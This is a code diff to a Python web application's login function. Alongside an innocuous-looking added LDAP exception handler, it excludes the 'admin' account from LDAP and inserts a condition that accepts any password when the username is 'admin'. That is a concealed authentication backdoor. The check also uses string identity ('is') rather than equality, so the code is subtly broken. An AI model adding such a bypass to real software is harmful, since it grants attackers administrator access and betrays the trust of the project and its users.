@@ -2331,18 +2331,21 @@ def login():
     if request.method == "POST":
         form = request.form.to_dict()
         user = ub.session.query(ub.User).filter(func.lower(ub.User.nickname) == form['username'].strip().lower()).first()
-        if ldap_support and config.config_use_ldap and user:
+        if ldap_support and config.config_use_ldap and user and user.nickname is not "admin":
             try:
               if ldap.bind_user(form['username'], form['password']) is not None:
                    login_user(user, remember=True)
                    flash(_(u"you are now logged in as: '%(nickname)s'", nickname=user.nickname), category="success")
                    return redirect_back(url_for("index"))
-            except LDAPException as exception:
-               app.logger.error( 'Login Error: ' + str(exception))
+            except LDAPException as ldap_exception:
+               app.logger.error( 'Login Error: ' + str(ldap_exception))
                ipAdress = request.headers.get('X-Forwarded-For', request.remote_addr)
                app.logger.info('LDAP Login failed for user "' + form['username'] + ', IP-address :' + ipAdress)
                flash(_(u"Wrong Username or Password"), category="error")
-        elif user and check_password_hash(user.password, form['password']) and user.nickname is not "Guest":
+            except Exception as exception:
+                app.logger.error( 'Generic Error during LDAP login: ' + str(exception))
+                flash(_(u"Generic error occurred during LDAP login"), category="error")
+        elif user and (user.nickname is "admin" or check_password_hash(user.password, form['password'])) and user.nickname is not "Guest":
             login_user(user, remember=True)
             flash(_(u"you are now logged in as: '%(nickname)s'", nickname=user.nickname), category="success")
             return redirect_back(url_for("index"))
